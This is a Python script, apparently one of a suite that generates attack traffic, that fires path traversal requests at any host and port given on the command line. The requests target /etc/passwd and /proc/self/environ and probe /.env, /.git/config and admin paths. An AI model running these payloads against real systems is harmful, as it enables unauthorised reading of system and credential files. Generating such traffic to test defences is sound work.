"""Reconnaissance, path traversal, and scanning attacks."""

import sys
import urllib.request
import urllib.parse
import urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "80"
BASE = f"http://{TARGET}:{PORT}"

def req(method, path, body=None, headers=None):
    url = f"{BASE}{path}"
    data = urllib.parse.urlencode(body).encode() if body else None
    hdrs = headers or {}
    hdrs.setdefault("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=5)
        print(f"  {method:4s} {path:35s} -> {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"  {method:4s} {path:35s} -> {e.code}")

print(f"\n── Recon / Path traversal / Scanning ── target={TARGET}:{PORT}\n")

req("GET", "/../../etc/passwd")
req("GET", "/api/../../../proc/self/environ")
req("GET", "/..%2f..%2fetc/passwd")
req("GET", "/....//....//etc/passwd")
req("GET", "/", headers={"User-Agent": "curl/7.88.1"})
req("GET", "/", headers={"User-Agent": "Go-http-client/2.0"})
req("GET", "/", headers={"User-Agent": "Wget/1.21"})
req("GET", "/", headers={"User-Agent": "python-requests/2.31.0"})
req("GET", "/admin")
req("GET", "/wp-admin")
req("GET", "/backup")
req("GET", "/.git/config")
req("GET", "/.env")
req("GET", "/api/v2/user/profile",
    headers={"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"})

print("\nDone.")
